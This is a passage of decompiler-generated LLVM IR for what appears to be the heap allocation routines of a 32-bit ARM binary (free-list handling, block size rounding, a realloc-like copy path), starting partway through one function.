  %v0_126a8 = phi i32 [ %v4_1268c, %dec_label_pc_12688 ], [ 0, %dec_label_pc_12698 ]
  store i32 %v0_126a8, i32* %r0.global-to-local, align 4
  store i32 %v3_12578, i32* @r4, align 4
  store i32 %v6_12578, i32* @r5, align 4
  store i32 %v9_12578, i32* @r6, align 4
  ret i32 %v0_126a8

; uselistorder directives
  uselistorder i32 %v0_126a8, { 1, 0 }
  uselistorder i32 %v3_1266c, { 1, 0, 2 }
  uselistorder i32 %v1_1261c, { 1, 0, 2 }
  uselistorder i32 %v1_12608, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_125b8, { 1, 0, 2 }
  uselistorder i32 %v0_1257c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 4, 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 18, 19, 3, 4, 5, 6, 7, 8, 10, 9, 2, 12, 11, 13, 14, 15, 16, 17, 0, 1 }
  uselistorder label %dec_label_pc_126a8, { 1, 0 }
  uselistorder label %dec_label_pc_12688, { 1, 0 }
  uselistorder label %dec_label_pc_1262c, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12594, { 1, 0 }
}

define i32 @function_126cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_126cc:
  %stack_var_-12 = alloca i32, align 4
  %v3_126cc = load i32, i32* @r4, align 4
  store i32 %v3_126cc, i32* %stack_var_-12, align 4
  %v6_126cc = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_126d4 = mul i32 %arg2, %arg1
  store i32 %v2_126d4, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_126d8 = icmp eq i32 %arg1, 0
  store i32 %v2_126d4, i32* @r0, align 4
  br i1 %v2_126d8, label %dec_label_pc_12704, label %dec_label_pc_126e4

dec_label_pc_126e4:                               ; preds = %dec_label_pc_126cc
  %v0_126e4 = call i32 @function_11768()
  %v0_126e8 = load i32, i32* @r5, align 4
  %v9_126e8 = icmp eq i32 %v0_126e8, %v0_126e4
  store i32 0, i32* @r5, align 4
  br i1 %v9_126e8, label %dec_label_pc_126e4.dec_label_pc_12704_crit_edge, label %dec_label_pc_126f4

dec_label_pc_126e4.dec_label_pc_12704_crit_edge:  ; preds = %dec_label_pc_126e4
  %v0_12704.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12704

dec_label_pc_126f4:                               ; preds = %dec_label_pc_126e4
  %v0_126f4 = call i32 @function_120c4()
  %v2_126fc = inttoptr i32 %v0_126f4 to i32*
  store i32 12, i32* %v2_126fc, align 4
  br label %dec_label_pc_1271c

dec_label_pc_12704:                               ; preds = %dec_label_pc_126e4.dec_label_pc_12704_crit_edge, %dec_label_pc_126cc
  %v0_12704 = phi i32 [ %v0_12704.pre, %dec_label_pc_126e4.dec_label_pc_12704_crit_edge ], [ %v2_126d4, %dec_label_pc_126cc ]
  %v1_12708 = call i32 @function_12578(i32 %v0_12704)
  store i32 %v1_12708, i32* @r5, align 4
  store i32 75548, i32* @lr, align 4
  %v1_12718 = icmp ne i32 %v1_12708, 0
  call void @__pseudo_cond_branch(i1 %v1_12718, i32 ptrtoint (i32* @global_var_12130.401 to i32))
  br label %dec_label_pc_1271c

dec_label_pc_1271c:                               ; preds = %dec_label_pc_126f4, %dec_label_pc_12704
  %v0_1271c = load i32, i32* @r5, align 4
  %v2_12720 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12720, i32* @r4, align 4
  store i32 %v6_126cc, i32* @r5, align 4
  ret i32 %v0_1271c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1271c, { 1, 0 }
}

define i32 @function_12724() local_unnamed_addr {
dec_label_pc_12724:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_12724 = load i32, i32* @r0, align 4
  %v2_12724 = icmp eq i32 %v0_12724, 0
  %v3_12728 = load i32, i32* @r4, align 4
  store i32 %v3_12728, i32* %stack_var_-24, align 4
  %v6_12728 = load i32, i32* @r5, align 4
  %v9_12728 = load i32, i32* @r6, align 4
  %v15_12728 = load i32, i32* @r8, align 4
  br i1 %v2_12724, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_12724
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_12724
  %v1_12730 = add i32 %v0_12724, -4
  %v2_12730 = inttoptr i32 %v1_12730 to i32*
  %v3_12730 = load i32, i32* %v2_12730, align 4
  store i32 %v3_12730, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1c91c.394 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_12730, i32* @r4, align 4
  %v1_12748 = call i32 @function_1310c()
  %v0_1274c = load i32, i32* @r4, align 4
  %v0_12750 = load i32, i32* @r5, align 4
  %v4_12758 = call i32 @function_12a80(i32* bitcast (i32** @global_var_1c91c.394 to i32*), i32 %v0_1274c, i32 %v0_12750)
  %v1_12760 = inttoptr i32 %v4_12758 to i32*
  %v2_12760 = load i32, i32* %v1_12760, align 4
  store i32 %v2_12760, i32* %r6.global-to-local, align 4
  %v2_12764 = load i32, i32* @global_var_1cb00.397, align 4
  %v4_12768 = mul i32 %v2_12764, 8
  %v6_12768 = icmp ult i32 %v2_12760, %v4_12768
  store i32 %v4_12758, i32* @r4, align 4
  br i1 %v6_12768, label %dec_label_pc_127a8, label %dec_label_pc_12774

dec_label_pc_12774:                               ; preds = %bb11
  %v1_1277c = call i32 @function_1310c()
  %v1_12784 = call i32 @function_138c0(i32 0)
  %v0_12788 = load i32, i32* @r4, align 4
  %v1_12788 = add i32 %v0_12788, 12
  store i32 %v1_12788, i32* @r5, align 4
  %v9_1278c = icmp eq i32 %v1_12788, %v1_12784
  br i1 %v9_1278c, label %dec_label_pc_127b0, label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12774
  %v1_127a0 = call i32 @function_1310c()
  br label %dec_label_pc_127a8

dec_label_pc_127a8:                               ; preds = %bb11, %dec_label_pc_12794, %bb14
  %v2_127a8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_127a8, i32* @r4, align 4
  store i32 %v6_12728, i32* @r5, align 4
  store i32 %v9_12728, i32* %r6.global-to-local, align 4
  store i32 %v15_12728, i32* %r8.global-to-local, align 4
  %v0_127ac = call i32 @function_1310c()
  %v0_127b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_127b0

dec_label_pc_127b0:                               ; preds = %dec_label_pc_12774, %dec_label_pc_127a8
  %v1_127b8 = phi i32 [ %v0_12788, %dec_label_pc_12774 ], [ %v0_127b0.pre, %dec_label_pc_127a8 ]
  %v1_127b0 = add i32 %v1_127b8, 4
  %v2_127b0 = inttoptr i32 %v1_127b0 to i32*
  %v3_127b0 = load i32, i32* %v2_127b0, align 4
  %v2_127b4 = icmp eq i32 %v3_127b0, 0
  br i1 %v2_127b4, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_127b0
  %v2_127b8 = add i32 %v1_127b8, 8
  %v3_127b8 = inttoptr i32 %v2_127b8 to i32*
  %v4_127b8 = load i32, i32* %v3_127b8, align 4
  %v3_127bc = add i32 %v3_127b0, 8
  %v4_127bc = inttoptr i32 %v3_127bc to i32*
  store i32 %v4_127b8, i32* %v4_127bc, align 4
  %v0_127c0.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_127b0, %bb12
  %v0_127c0 = phi i32 [ %v1_127b8, %dec_label_pc_127b0 ], [ %v0_127c0.pre, %bb12 ]
  %v1_127c0 = add i32 %v0_127c0, 8
  %v2_127c0 = inttoptr i32 %v1_127c0 to i32*
  %v3_127c0 = load i32, i32* %v2_127c0, align 4
  %v1_127c4 = add i32 %v0_127c0, 4
  %v2_127c4 = inttoptr i32 %v1_127c4 to i32*
  %v3_127c4 = load i32, i32* %v2_127c4, align 4
  %v2_127c8 = icmp eq i32 %v3_127c0, 0
  br i1 %v2_127c8, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_127cc = add i32 %v3_127c0, 4
  %v4_127cc = inttoptr i32 %v3_127cc to i32*
  store i32 %v3_127c4, i32* %v4_127cc, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_127d0 = load i32, i32* %r8.global-to-local, align 4
  %v3_127d0 = inttoptr i32 %v2_127d0 to i32*
  store i32 %v3_127c4, i32* %v3_127d0, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_127e0 = call i32 @function_1310c()
  %v0_127e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_127e4 = load i32, i32* @r4, align 4
  %v0_127ec = load i32, i32* @r5, align 4
  %v2_127e4 = sub i32 12, %v0_127e4
  %v1_127e8 = add i32 %v2_127e4, %v1_127e4
  %v2_127ec = sub i32 %v1_127e8, %v0_127ec
  %v1_127f0 = call i32 @function_138c0(i32 %v2_127ec)
  br label %dec_label_pc_127a8

; uselistorder directives
  uselistorder i32 %v0_127c0, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_138c0, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_127b0, { 1, 0 }
  uselistorder label %dec_label_pc_127a8, { 2, 1, 0 }
}

define i32 @function_12814(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12814:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12814 = load i32, i32* @r4, align 4
  store i32 %v3_12814, i32* %stack_var_-24, align 4
  %v6_12814 = load i32, i32* @r5, align 4
  %v9_12814 = load i32, i32* @r6, align 4
  %v12_12814 = load i32, i32* @r7, align 4
  %v15_12814 = load i32, i32* @r8, align 4
  %v18_12814 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_12818 = icmp eq i32 %arg2, 0
  %v0_1281c = load i32, i32* @r0, align 4
  store i32 %v0_1281c, i32* @r7, align 4
  br i1 %v2_12818, label %dec_label_pc_12824, label %dec_label_pc_1282c

dec_label_pc_12824:                               ; preds = %dec_label_pc_12814
  %v0_12824 = call i32 @function_12724()
  %v0_12834.pre = load i32, i32* @r4, align 4
  %v2_12838.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_12834

dec_label_pc_1282c:                               ; preds = %dec_label_pc_12814
  %v2_1282c = icmp eq i32 %v0_1281c, 0
  br i1 %v2_1282c, label %dec_label_pc_12834, label %dec_label_pc_12840

dec_label_pc_12834:                               ; preds = %dec_label_pc_1282c, %dec_label_pc_12824
  %v2_12838 = phi i32 [ %v3_12814, %dec_label_pc_1282c ], [ %v2_12838.pre, %dec_label_pc_12824 ]
  %v0_12834 = phi i32 [ %arg2, %dec_label_pc_1282c ], [ %v0_12834.pre, %dec_label_pc_12824 ]
  store i32 %v2_12838, i32* @r4, align 4
  store i32 %v6_12814, i32* @r5, align 4
  store i32 %v9_12814, i32* @r6, align 4
  store i32 %v12_12814, i32* @r7, align 4
  store i32 %v18_12814, i32* @lr, align 4
  %v1_1283c = call i32 @function_12578(i32 %v0_12834)
  %v0_12840.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12840

dec_label_pc_12840:                               ; preds = %dec_label_pc_1282c, %dec_label_pc_12834
  %v0_12858 = phi i32 [ %v0_1281c, %dec_label_pc_1282c ], [ %v1_1283c, %dec_label_pc_12834 ]
  %v0_12840 = phi i32 [ %arg2, %dec_label_pc_1282c ], [ %v0_12840.pre, %dec_label_pc_12834 ]
  %v1_12840 = add i32 %v0_12840, 7
  %v1_12844 = and i32 %v1_12840, -4
  store i32 %v1_12844, i32* @r5, align 4
  %v2_12848 = icmp ugt i32 %v1_12844, 10
  %v1_1284c = add i32 %v0_12858, -4
  %v2_1284c = inttoptr i32 %v1_1284c to i32*
  %v3_1284c = load i32, i32* %v2_1284c, align 4
  store i32 %v3_1284c, i32* @r6, align 4
  br i1 %v2_12848, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_12840
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_12840, %bb
  %v0_128d4 = phi i32 [ %v1_12844, %dec_label_pc_12840 ], [ 12, %bb ]
  store i32 %v1_1284c, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_128d4, %v3_1284c
  br i1 %tmp, label %dec_label_pc_12860, label %dec_label_pc_128d4

dec_label_pc_12860:                               ; preds = %bb14
  %v2_12854 = sub i32 %v0_128d4, %v3_1284c
  %v1_12870 = call i32 @function_1310c()
  %v0_12878 = load i32, i32* @r8, align 4
  %v1_12878 = load i32, i32* @r6, align 4
  %v2_12878 = add i32 %v1_12878, %v0_12878
  %v4_12880 = call i32 @function_129c0(i32* bitcast (i32** @global_var_1c91c.394 to i32*), i32 %v2_12878, i32 %v2_12854)
  store i32 %v4_12880, i32* @r4, align 4
  store i32 75928, i32* @lr, align 4
  %v1_12894 = call i32 @function_1310c()
  %v0_12898 = load i32, i32* @r4, align 4
  %v2_12898 = icmp eq i32 %v0_12898, 0
  br i1 %v2_12898, label %dec_label_pc_128a8, label %.thread

.thread:                                          ; preds = %dec_label_pc_12860
  %v1_1289c = load i32, i32* @r6, align 4
  %v3_1289c = add i32 %v1_1289c, %v0_12898
  %v2_128a0 = load i32, i32* @r7, align 4
  %v3_128a0 = add i32 %v2_128a0, -4
  %v4_128a0 = inttoptr i32 %v3_128a0 to i32*
  store i32 %v3_1289c, i32* %v4_128a0, align 4
  br label %dec_label_pc_12914

dec_label_pc_128a8:                               ; preds = %dec_label_pc_12860
  %v0_128a8 = load i32, i32* @r5, align 4
  %v1_128a8 = add i32 %v0_128a8, -4
  %v1_128ac = call i32 @function_12578(i32 %v1_128a8)
  store i32 %v1_128ac, i32* @r0, align 4
  store i32 %v1_128ac, i32* @r4, align 4
  %v2_128b0 = icmp eq i32 %v1_128ac, 0
  br i1 %v2_128b0, label %dec_label_pc_128cc, label %dec_label_pc_128b8

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128a8
  %v0_128b8 = load i32, i32* @r6, align 4
  %v1_128b8 = add i32 %v0_128b8, -4
  store i32 %v1_128b8, i32* @r2, align 4
  %v0_128bc = load i32, i32* @r7, align 4
  store i32 %v0_128bc, i32* @r1, align 4
  %v3_128c0 = call i32 @function_12110(i32 %v1_128ac, i32 %v0_128bc, i32 %v1_128b8)
  %v0_128c4 = load i32, i32* @r7, align 4
  store i32 %v0_128c4, i32* @r0, align 4
  %v0_128c8 = call i32 @function_12724()
  %v0_128cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_128cc

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128a8, %dec_label_pc_128b8
  %v0_128cc = phi i32 [ 0, %dec_label_pc_128a8 ], [ %v0_128cc.pre, %dec_label_pc_128b8 ]
  store i32 %v0_128cc, i32* @r7, align 4
  br label %dec_label_pc_12914

dec_label_pc_128d4:                               ; preds = %bb14
  %v1_128d4 = add i32 %v0_128d4, 28
  %tmp15 = icmp ugt i32 %v1_128d4, %v3_1284c
  br i1 %tmp15, label %dec_label_pc_12914, label %dec_label_pc_128e0

dec_label_pc_128e0:                               ; preds = %dec_label_pc_128d4
  %v1_128ec = call i32 @function_1310c()
  %v0_128f0 = load i32, i32* @r8, align 4
  %v1_128f0 = load i32, i32* @r5, align 4
  %v2_128f0 = add i32 %v1_128f0, %v0_128f0
  %v1_128f4 = load i32, i32* @r6, align 4
  %v2_128f4 = sub i32 %v1_128f4, %v1_128f0
  %v4_128fc = call i32 @function_12a80(i32* bitcast (i32** @global_var_1c91c.394 to i32*), i32 %v2_128f0, i32 %v2_128f4)
  store i32 76048, i32* @lr, align 4
  %v1_1290c = call i32 @function_1310c()
  %v0_12910 = load i32, i32* @r5, align 4
  %v1_12910 = load i32, i32* @r7, align 4
  %v2_12910 = add i32 %v1_12910, -4
  %v3_12910 = inttoptr i32 %v2_12910 to i32*
  store i32 %v0_12910, i32* %v3_12910, align 4
  br label %dec_label_pc_12914

dec_label_pc_12914:                               ; preds = %.thread, %dec_label_pc_128d4, %dec_label_pc_128cc, %dec_label_pc_128e0
  %v0_12914 = load i32, i32* @r7, align 4
  %v2_12918 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12918, i32* @r4, align 4
  store i32 %v6_12814, i32* @r5, align 4
  store i32 %v9_12814, i32* @r6, align 4
  store i32 %v12_12814, i32* @r7, align 4
  store i32 %v15_12814, i32* @r8, align 4
  ret i32 %v0_12914

; uselistorder directives
  uselistorder i32 %v1_128f0, { 1, 0 }
  uselistorder i32 %v0_128d4, { 1, 2, 0 }
  uselistorder i32 %v3_1284c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32** @global_var_1c91c.394, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1c91c.394 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32)* @function_12578, { 1, 38, 0, 4, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder i32 ()* @function_12724, { 1, 0, 4, 3, 2, 5, 7, 6 }
  uselistorder i32* @r8, { 117, 118, 119, 120, 122, 121, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 30, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 138, 139, 140, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 1, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 2, 116, 141, 3, 142, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 78, 79, 80, 81, 82, 83, 84 }
  uselistorder i32* @r7, { 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 9, 10, 15, 16, 17, 2, 6, 7, 8, 24, 11, 12, 13, 14, 4, 18, 3, 19, 20, 21, 22, 23, 25, 1, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 54, 55, 56, 57, 233, 234, 235, 151, 152, 153, 154, 50, 0, 51, 52, 53, 58, 59, 60, 61, 62, 63, 5, 64, 65, 66, 67, 68, 69, 70, 71, 72, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 236, 237, 238, 239, 240, 241, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 142, 143, 144, 145, 146, 147, 148, 149, 150 }
  uselistorder label %dec_label_pc_12914, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_128cc, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_12840, { 1, 0 }
}

define i32 @function_1292c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1292c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_1292c = inttoptr i32 %arg2 to i32*
  %v2_1292c = load i32, i32* %v1_1292c, align 4
  %v3_12930 = load i32, i32* @r4, align 4
  store i32 %v3_12930, i32* %stack_var_-8, align 4
  %v1_12934 = add i32 %v2_1292c, 3
  %v1_12938 = and i32 %v1_12934, -4
  store i32 %v1_12938, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12940 = icmp ugt i32 %v1_12938, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12948 = load i32, i32* %arg1, align 4
  store i32 %v2_12948, i32* %r0.global-to-local, align 4
  br i1 %v2_12940, label %dec_label_pc_129b4.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_1292c
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_129b4.preheader

dec_label_pc_129b4.preheader:                     ; preds = %dec_label_pc_1292c, %bb
  %v1_12968 = phi i32 [ %v1_12938, %dec_label_pc_1292c ], [ 12, %bb ]
  %v2_129b49 = icmp eq i32 %v2_12948, 0
  br i1 %v2_129b49, label %dec_label_pc_129bc, label %dec_label_pc_12954

dec_label_pc_12954:                               ; preds = %dec_label_pc_129b4.preheader, %dec_label_pc_129b0
  %v2_1296c = phi i32 [ %v3_129b0, %dec_label_pc_129b0 ], [ %v2_12948, %dec_label_pc_129b4.preheader ]
  %v1_12954 = inttoptr i32 %v2_1296c to i32*
  %v2_12954 = load i32, i32* %v1_12954, align 4
  store i32 %v2_12954, i32* %ip.global-to-local, align 4
  %v3_12958 = icmp ult i32 %v2_12954, %v1_12968
  br i1 %v3_12958, label %dec_label_pc_129b0, label %dec_label_pc_12960

dec_label_pc_12960:                               ; preds = %dec_label_pc_12954
  %v1_12960 = add i32 %v1_12968, 44
  %v3_12964 = icmp ult i32 %v2_12954, %v1_12960
  br i1 %v3_12964, label %dec_label_pc_12974, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_12960
  %v2_12958.le = sub i32 %v2_12954, %v1_12968
  store i32 %v2_12958.le, i32* %v1_12954, align 4
  %v0_129a0.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_129a8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_12974:                               ; preds = %dec_label_pc_12960
  %v1_12974 = add i32 %v2_1296c, 4
  %v2_12974 = inttoptr i32 %v1_12974 to i32*
  %v3_12974 = load i32, i32* %v2_12974, align 4
  store i32 %v3_12974, i32* %r2.global-to-local, align 4
  %v2_12978 = icmp eq i32 %v3_12974, 0
  br i1 %v2_12978, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_12974
  %v2_1297c = add i32 %v2_1296c, 8
  %v3_1297c = inttoptr i32 %v2_1297c to i32*
  %v4_1297c = load i32, i32* %v3_1297c, align 4
  %v3_12980 = add i32 %v3_12974, 8
  %v4_12980 = inttoptr i32 %v3_12980 to i32*
  store i32 %v4_1297c, i32* %v4_12980, align 4
  %v0_12984.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12974, %bb27
  %v0_12984 = phi i32 [ %v2_1296c, %dec_label_pc_12974 ], [ %v0_12984.pre, %bb27 ]
  %v1_12984 = add i32 %v0_12984, 8
  %v2_12984 = inttoptr i32 %v1_12984 to i32*
  %v3_12984 = load i32, i32* %v2_12984, align 4
  %v1_12988 = add i32 %v0_12984, 4
  %v2_12988 = inttoptr i32 %v1_12988 to i32*
  %v3_12988 = load i32, i32* %v2_12988, align 4
  %v2_1298c = icmp eq i32 %v3_12984, 0
  br i1 %v2_1298c, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_12990 = add i32 %v3_12984, 4
  %v4_12990 = inttoptr i32 %v3_12990 to i32*
  store i32 %v3_12988, i32* %v4_12990, align 4
  %v1_12998 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_12998, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_12994 = load i32, i32* %r1.global-to-local, align 4
  %v3_12994 = inttoptr i32 %v2_12994 to i32*
  store i32 %v3_12988, i32* %v3_12994, align 4
  %v1_1299c.pre = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_1299c.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_129a8 = phi i32 [ %v0_129a8.pre, %.thread._crit_edge ], [ %v1_12998, %bb28 ], [ %v1_1299c.pre, %.thread5 ]
  %v0_129a0 = phi i32 [ %v0_129a0.pre, %.thread._crit_edge ], [ %v1_12998, %bb28 ], [ %v1_1299c.pre, %.thread5 ]
  %v1_129a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_129a0 = sub i32 %v1_129a0, %v0_129a0
  %v1_129a4 = add i32 %v2_129a0, 12
  store i32 %v1_129a4, i32* %r0.global-to-local, align 4
  %v1_129a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_129a8 = inttoptr i32 %v1_129a8 to i32*
  store i32 %v0_129a8, i32* %v2_129a8, align 4
  %v2_129ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_129ac, i32* %r4.global-to-local, align 4
  ret i32 %v1_129a4

dec_label_pc_129b0:                               ; preds = %dec_label_pc_12954
  %v1_129b0 = add i32 %v2_1296c, 4
  %v2_129b0 = inttoptr i32 %v1_129b0 to i32*
  %v3_129b0 = load i32, i32* %v2_129b0, align 4
  store i32 %v3_129b0, i32* %r0.global-to-local, align 4
  %v2_129b4 = icmp eq i32 %v3_129b0, 0
  br i1 %v2_129b4, label %dec_label_pc_129b4.dec_label_pc_129bc_crit_edge, label %dec_label_pc_12954

dec_label_pc_129b4.dec_label_pc_129bc_crit_edge:  ; preds = %dec_label_pc_129b0
  br label %dec_label_pc_129bc

dec_label_pc_129bc:                               ; preds = %dec_label_pc_129b4.dec_label_pc_129bc_crit_edge, %dec_label_pc_129b4.preheader
  store i32 %v3_12930, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_129b0, { 1, 2, 0 }
  uselistorder i32 %v0_12984, { 1, 0 }
  uselistorder i32 %v2_12954, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1296c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_12968, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12954, { 1, 0 }
  uselistorder label %dec_label_pc_129b4.preheader, { 1, 0 }
}

define i32 @function_129c0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_129c0:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_129c4 = load i32, i32* %arg1, align 4
  store i32 %v2_129c4, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_12a3c6 = icmp eq i32 %v2_129c4, 0
  br i1 %v2_12a3c6, label %dec_label_pc_12a44, label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %dec_label_pc_129c0, %dec_label_pc_12a38
  %v0_12a10 = phi i32 [ %v3_12a38, %dec_label_pc_12a38 ], [ %v2_129c4, %dec_label_pc_129c0 ]
  %v1_129d0 = inttoptr i32 %v0_12a10 to i32*
  %v2_129d0 = load i32, i32* %v1_129d0, align 4
  store i32 %v2_129d0, i32* %r0.global-to-local, align 4
  %v2_129d4 = sub i32 %v0_12a10, %v2_129d0
  %v1_129d8 = add i32 %v2_129d4, 12
  %v3_129dc = icmp uge i32 %v1_129d8, %arg2
  %v9_129dc = icmp eq i32 %v1_129d8, %arg2
  %v2_129e0 = xor i1 %v9_129dc, true
  %v3_129e0 = and i1 %v3_129dc, %v2_129e0
  br i1 %v3_129e0, label %dec_label_pc_12a38, label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %dec_label_pc_129d0
  br i1 %v9_129dc, label %dec_label_pc_129e8, label %dec_label_pc_12a44

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129e4
  %v1_129e8 = add i32 %arg3, 3
  %v1_129ec = and i32 %v1_129e8, -4
  store i32 %v1_129ec, i32* %r2.global-to-local, align 4
  %v2_129f0 = sub i32 %v2_129d0, %v1_129ec
  %v3_129f0 = icmp ult i32 %v2_129d0, %v1_129ec
  br i1 %v3_129f0, label %dec_label_pc_12a44, label %dec_label_pc_129f8

